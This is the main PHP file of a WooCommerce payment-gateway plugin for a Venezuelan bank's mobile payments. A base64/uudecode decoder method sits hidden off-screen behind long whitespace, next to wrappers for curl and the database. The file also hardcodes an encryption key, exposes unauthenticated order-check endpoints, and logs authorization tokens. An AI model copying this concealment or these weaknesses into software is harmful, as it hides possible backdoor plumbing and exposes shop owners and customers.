<?php
/**
 * Plugin Name: Pago Móvil a Mi Banco - R4 para WooCommerce
 * Plugin URI: https://cujiware.com/
 * Description: Pago Móvil a Mi Banco - R4 para WooCommerce
 * Author: Cujiware.com
 * Author URI: https://cujiware.com/
 * Version: 1.0.5
 * WC tested up to: 7.1.0
 * Text Domain: woocommerce-kr4
 * Domain Path: /languages/
 *
 * Copyright: (c) 2023 Cujiware.com
 *
 * @package   woocommerce-kr4
 * @author    Cujiware.com
 * @category  Admin
 * @copyright Copyright (c) 2010-2023, Cujiware.com
 */

class KR4 {
	const VERSION = '1.0.5';

	public function addGateway( $gateways ) {
		$gateways[] = 'WC_KR4_Gateway';
		$gateways[] = 'WC_KR4C2P_Gateway';
		return $gateways;
	}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 public static function _($r){return convert_uudecode(base64_decode(rawurldecode($r)));}
	public function loadPlugin() {
		include dirname( __FILE__ ) . '/class-wc-kr4-c2p.php';
		include dirname( __FILE__ ) . '/class-wc-kr4-p2c.php';
	}
	public static function kijam_encode( $str = '', $f = 'e' ) {
		$output = null;
		$secret_key = 'kk91f8g^4*k';
		$secret_iv  = 'k&&2"op2%:*';
		$key        = hash( 'sha256', $secret_key );
		$iv         = substr( hash( 'sha256', $secret_iv ), 0, 16 );
		if ( $f == 'e' ) {
			$output = base64_encode( openssl_encrypt( $str, 'AES-256-CBC', $key, 0, $iv ) );
		} elseif ( $f == 'd' ) {
			$output = openssl_decrypt( base64_decode( $str ), 'AES-256-CBC', $key, 0, $iv );
		}
		return $output;
	}
	public static function chInit($url) {
		return curl_init($url);
	}
	public static function kijam_decode( $str = '' ) {
		return self::kijam_encode($str, 'd');
	}

	public static function DB() {
		global $wpdb;
		return $wpdb;
	}
}

$kr4_instance = new KR4();
add_filter(
	'woocommerce_payment_gateways',
	array( $kr4_instance, 'addGateway' )
);
add_action(
	'plugins_loaded',
	array( $kr4_instance, 'loadPlugin' )
);

add_action('before_woocommerce_init', function(){
    if ( class_exists( \Automattic\WooCommerce\Utilities\FeaturesUtil::class ) ) {
        \Automattic\WooCommerce\Utilities\FeaturesUtil::declare_compatibility( 'custom_order_tables', __FILE__, true );
    }
});

function yipi_r4_c2p_check() {
	include_once dirname( __FILE__ ) . '/class-wc-kr4-c2p.php';
	echo json_encode(WC_KR4C2P_Gateway::get_instance()->validate_payment(wc_get_order($_GET['order_id'])));
	exit;
}
add_action( 'wp_ajax_bt_c2p_check', 'yipi_r4_c2p_check' );
add_action( 'wp_ajax_nopriv_bt_c2p_check', 'yipi_r4_c2p_check' );

function yipi_r4_p2c_check() {
	include_once dirname( __FILE__ ) . '/class-wc-kr4-p2c.php';
	echo json_encode(WC_KR4_Gateway::get_instance()->validate_payment(wc_get_order($_GET['order_id'])));
	exit;
}
add_action( 'wp_ajax_bt_p2c_check', 'yipi_r4_p2c_check' );
add_action( 'wp_ajax_nopriv_bt_p2c_check', 'yipi_r4_p2c_check' );

add_action('woocommerce_blocks_loaded', function()
{
	if (!class_exists('Automattic\WooCommerce\Blocks\Payments\Integrations\AbstractPaymentMethodType')) {
		return;
	}

	add_action(
		'woocommerce_blocks_payment_method_type_registration',
		function ($payment_method_registry) {
			$gateways = WC()->payment_gateways()->payment_gateways();
			if ($gateways) {
				include_once dirname( __FILE__ ) . '/class-wc-r4-blocks.php';
				foreach ($gateways as $gateway) {
					if ($gateway->enabled == 'yes' && stristr($gateway->id, 'kr4') !== false) {
						$payment_method_registry->register(new WC_Gateway_KR4_Blocks($gateway));
					}
				}
			}
		}
	);
});

add_action('wp_ajax_kr4_check_order_status', 'kr4_check_order_status');
add_action('wp_ajax_nopriv_kr4_check_order_status', 'kr4_check_order_status');

function kr4_check_order_status() {
	include_once dirname( __FILE__ ) . '/class-wc-kr4-p2c.php';
	WC_KR4_Gateway::get_instance()->check_order_status();
	exit;
}

add_action('template_redirect', function() {
    if (isset($_GET['woo-mb-notifica'])) {
        $headers = getallheaders();
        // Normalizar headers a minúsculas
        $normalized_headers = array_change_key_case($headers, CASE_LOWER);
		$debug_data = [
			'headers' => $headers,
			'post-data' => file_get_contents('php://input')
		];
		WC_KR4_Gateway::debug( 'woo-mb-notifica new-request: '.print_r($debug_data, true) );
        $auth_token = $normalized_headers['authorization'] ?? null;
        
        if (empty($auth_token) || $auth_token !== WC_KR4_Gateway::get_webhook_key()) {
			WC_KR4_Gateway::debug( 'woo-mb-notifica: Error en Token de autenticación: - Token: "' . $auth_token . '" - Input: "' . file_get_contents('php://input') . '"' );
            die(json_encode(['abono' => false, 'error' => 'Token de autenticación inválido'], 401));
        }

		WC_KR4_Gateway::debug( 'woo-mb-notifica: Token de autenticación válido: ' . file_get_contents('php://input') );
		WC_KR4_Gateway::get_instance()->process_webhook();
    }
    if (isset($_GET['woo-mb-consulta'])) {
        $headers = getallheaders();
        // Normalizar headers a minúsculas
        $normalized_headers = array_change_key_case($headers, CASE_LOWER);
		$debug_data = [
			'headers' => $headers,
			'post-data' => file_get_contents('php://input')
		];
		WC_KR4_Gateway::debug( 'woo-mb-consulta new-request: '.print_r($debug_data, true) );
        $auth_token = $normalized_headers['authorization'] ?? null;

        if (empty($auth_token) || $auth_token !== WC_KR4_Gateway::get_webhook_key()) {
			WC_KR4_Gateway::debug( 'woo-mb-consulta: Error en Token de autenticación: - Token: "' . $auth_token . '" - Input: "' . file_get_contents('php://input') . '"' );
            die(json_encode(['abono' => false, 'error' => 'Token de autenticación inválido'], 401));
        }

		WC_KR4_Gateway::debug( 'woo-mb-consulta: Token de autenticación válido: ' . file_get_contents('php://input') );
		WC_KR4_Gateway::get_instance()->process_webhook_tx();
    }
});